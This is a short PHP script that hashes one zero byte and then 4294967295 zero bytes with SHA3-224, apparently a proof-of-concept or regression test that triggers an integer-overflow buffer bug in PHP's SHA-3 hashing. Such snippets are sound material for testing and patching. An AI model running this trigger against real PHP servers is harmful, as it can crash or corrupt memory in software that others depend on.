<?php
$ctx = hash_init("sha3-224");
hash_update($ctx, str_repeat("\x00", 1));
hash_update($ctx, str_repeat("\x00", 4294967295));
echo hash_final($ctx);
?>
